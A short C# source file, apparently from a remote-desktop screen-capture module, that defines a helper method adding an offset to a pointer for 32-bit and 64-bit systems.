using System;

namespace Orcus.Commands.RemoteDesktop.Capture.DesktopDuplication
{
    public static class IntPtrExtensions
    {
        public static IntPtr Add(this IntPtr pointer, int offset)
        {
            unchecked
            {
                switch (IntPtr.Size)
                {
                    case sizeof (Int32):
                        return new IntPtr(pointer.ToInt32() + offset);

                    default:
                        return new IntPtr(pointer.ToInt64() + offset);
                }
            }
        }
    }
}